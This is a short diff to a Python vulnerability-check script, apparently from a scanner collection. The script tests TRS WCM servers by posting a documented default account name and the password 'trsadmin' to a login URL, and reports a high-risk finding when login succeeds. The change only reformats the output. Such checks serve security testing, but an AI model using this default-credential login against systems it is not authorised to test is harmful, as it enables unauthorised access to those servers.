@@ -7,6 +7,7 @@ author: Lucifer
 description: TRS wcm系统中存在"依申请公开"这个默认用户,默认密码是trsadmin,可直接登录。
 '''
 import sys
+import json
 import requests
 import warnings
 from termcolor import cprint
@@ -30,7 +31,7 @@ class trs_wcm_default_user_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"WCM IMPORTS BEGIN" in req.text and r"main.jsp" in req.text:
-                cprint("[+]存在TRS wcm系统默认账户漏洞...(高危)\tpayload: "+vulnurl+"\tpost: 依申请公开:trsadmin", "red")
+                cprint("[+]存在TRS wcm系统默认账户漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
